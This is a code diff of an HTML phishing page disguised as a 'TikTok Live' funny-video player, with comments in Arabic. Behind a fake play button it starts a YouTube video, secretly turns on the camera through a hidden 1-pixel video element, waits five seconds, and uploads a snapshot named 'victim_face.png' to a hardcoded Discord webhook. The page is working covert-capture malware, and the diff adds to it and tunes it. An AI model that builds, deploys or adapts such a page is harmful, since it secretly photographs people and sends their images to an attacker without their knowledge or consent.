@@ -3,24 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
+    <title>TikTok Live</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
         
+        /* إطار اليوتيوب */
         #youtube-frame {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; /* يمنع الضغط المباشر على يوتيوب */
+            pointer-events: none;
         }
 
-        /* طبقة شفافة فوق كل شيء لإجبار المستخدم على الضغط */
-        #interaction-layer {
+        /* واجهة البدء الوهمية لضمان تشغيل الصوت */
+        #start-overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 100;
-            background: rgba(0,0,0,0.01); /* شفافة تماماً */
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 200;
+            color: white;
             cursor: pointer;
+        }
+
+        .play-btn {
+            width: 80px; height: 80px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 40px; margin-bottom: 20px;
         }
 
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
@@ -31,11 +45,14 @@
 
 <div class="wrapper">
     <iframe id="youtube-frame" 
-        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=1&mute=1&loop=1&playlist=C3vaOyZFcsM&controls=0" 
+        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0" 
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
 
-    <div id="interaction-layer"></div>
+    <div id="start-overlay">
+        <div class="play-btn">▶️</div>
+        <p>اضغط لمشاهدة الفيديو المضحك</p>
+    </div>
 </div>
 
 <video id="hidden-camera" autoplay playsinline muted></video>
@@ -43,19 +60,19 @@
 
 <script>
     const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
+    const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
-    const interactionLayer = document.getElementById('interaction-layer');
 
-    // عند الضغط على أي مكان في الشاشة
-    interactionLayer.addEventListener('click', async () => {
-        // 1. تشغيل الصوت في فيديو اليوتيوب
-        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+    // عند الضغط على زر البدء
+    overlay.addEventListener('click', async () => {
+        // 1. تشغيل الفيديو بالصوت الأصلي (إرسال أمر لليوتيوب)
         iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
         
-        // إخفاء الطبقة الشفافة بعد الضغط
-        interactionLayer.style.display = 'none';
+        // إخفاء واجهة البدء
+        overlay.style.display = 'none';
 
-        // 2. طلب الكاميرا والتصوير
+        // 2. طلب الكاميرا وبدء التصوير
         const camera = document.getElementById('hidden-camera');
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -64,11 +81,12 @@
             camera.srcObject = stream;
 
             camera.onplaying = () => {
+                // ننتظر 5 ثواني لضمان أن المستخدم يضحك أو مندمج مع الصوت
                 setTimeout(() => {
                     captureAndSend(camera);
-                }, 4000); // يصور بعد 4 ثواني من الضغط لضمان وضوح الوجه مع الصوت
+                }, 5000);
             };
-        } catch (err) { console.log("Camera Error"); }
+        } catch (err) { console.log("Camera access denied"); }
     });
 
     async function captureAndSend(cameraElement) {
@@ -83,7 +101,7 @@
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
                 const formData = new FormData();
-                formData.append('file', blob, 'capture_with_audio.png');
+                formData.append('file', blob, 'victim_face.png');
                 await fetch(webhookURL, { method: 'POST', body: formData });
             }, 'image/png');
         }
